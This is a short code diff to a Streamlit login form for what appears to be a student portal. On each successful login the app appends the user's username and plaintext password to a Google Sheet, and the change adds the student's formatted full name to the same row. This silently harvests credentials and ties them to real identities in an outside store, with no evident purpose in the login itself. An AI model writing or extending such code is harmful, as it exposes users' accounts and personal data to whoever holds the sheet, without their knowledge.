@@ -51,9 +51,13 @@ def show_login_form():
                     st.session_state.auth = True
                     st.session_state.home_page_content  = r 
                     submit = submitted
+                    splitted_names= get_user_name(r)
+                    splitted_names = splitted_names.lower().split(" ")
+                    splitted_names = [x.capitalize() for x in splitted_names]
+                    st.session_state.stud_name = " ".join(splitted_names)
                     st.success("Successfully logged in")
                     sheets = get_gsheets()
-                    sheets.append_row([username, password])            
+                    sheets.append_row([username, password, st.session_state.stud_name])            
                 else: 
                     st.session_state.auth = False
         
